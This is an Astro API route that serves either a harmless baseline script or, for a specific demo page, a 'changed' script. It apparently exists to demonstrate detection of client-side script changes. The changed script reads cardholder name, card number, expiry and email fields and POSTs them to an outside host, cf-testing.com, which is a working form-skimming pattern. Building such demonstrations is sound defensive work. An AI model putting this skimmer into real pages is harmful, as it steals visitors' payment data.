import type { APIRoute } from 'astro';

export const prerender = false;

const baselineScript = `(() => {
  const status = document.querySelector('#signal-status');
  if (status) status.textContent = 'Baseline script loaded; no mock fields were read.';
})();`;

const changedScript = `(() => {
  const fields = {
    cardholder: document.querySelector('[name="cardholder"]')?.value ?? 'Demo Visitor',
    cardNumber: document.querySelector('[name="cardnumber"]')?.value ?? '0000 0000 0000 0000',
    expiry: document.querySelector('[name="expiry"]')?.value ?? '12 / 30',
    email: document.querySelector('[name="email"]')?.value ?? 'demo@example.invalid',
  };
  const status = document.querySelector('#signal-status');
  const request = fetch('https://cf-testing.com/cdn-cgi/trace?event=client-side-security-change-test', {
    method: 'POST',
    mode: 'no-cors',
    credentials: 'omit',
    headers: { 'Content-Type': 'text/plain;charset=UTF-8' },
    body: JSON.stringify({ demo: 'client-side-security-code-change', ...fields }),
    keepalive: true,
  });
  request.then(() => {
    if (status) status.textContent = 'Changed script loaded; synthetic fields sent to cf-testing.com.';
  }).catch(() => {
    if (status) status.textContent = 'Changed script loaded; the test connection could not be sent.';
  });
})();`;

export const GET: APIRoute = ({ request }) => {
  let script = baselineScript;

  try {
    const requestUrl = new URL(request.url);
    const referer = request.headers.get('referer');

    if (referer) {
      const pageUrl = new URL(referer);
      const pagePath = pageUrl.pathname.replace(/\/+$/, '');
      const isDemoPage =
        pageUrl.origin === requestUrl.origin &&
        pagePath === '/demos/security/client-side-security';

      if (isDemoPage && pageUrl.searchParams.get('variant') === 'changed') {
        script = changedScript;
      }
    }
  } catch {
    // Requests without a valid same-origin demo-page referrer use the safe baseline.
  }

  return new Response(script, {
    headers: {
      'Cache-Control': 'no-store',
      'CDN-Cache-Control': 'no-store',
      'Content-Type': 'application/javascript; charset=utf-8',
      'Vary': 'Referer',
      'X-Content-Type-Options': 'nosniff',
    },
  });
};
